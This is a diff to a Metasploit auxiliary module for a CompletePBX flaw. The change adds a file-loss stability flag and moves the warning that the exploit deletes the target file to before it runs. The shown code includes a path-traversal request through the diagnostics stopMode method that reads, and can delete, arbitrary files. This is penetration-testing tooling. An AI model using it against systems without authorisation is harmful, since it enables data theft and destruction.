@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://chocapikk.com/posts/2025/completepbx/']
         ],
         'Notes' => {
-          'Stability' => [CRASH_SAFE],
+          'Stability' => [CRASH_SAFE, OS_RESOURCE_LOSS],
           'SideEffects' => [IOC_IN_LOGS],
           'Reliability' => []
         }
@@ -81,6 +81,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    print_warning('This exploit WILL delete the target file if permissions allow.')
+
+    sleep(3)
+
     sid_cookie = login
     target_file = "../../../../../../../../../../..#{datastore['TARGETFILE']}"
 
@@ -89,9 +93,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'uri' => normalize_uri(datastore['TARGETURI']),
       'method' => 'GET',
-      'headers' => {
-        'Cookie' => sid_cookie
-      },
+      'headers' => { 'Cookie' => sid_cookie },
       'vars_get' => {
         'class' => 'diagnostics',
         'method' => 'stopMode',
@@ -130,8 +132,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_good("Raw file content received:\n#{body}")
     end
-
-    print_warning('WARNING: This exploit causes the deletion of the requested file on the target if the privileges allows it.')
   end
 
   def list_files_in_zip(zip_data)
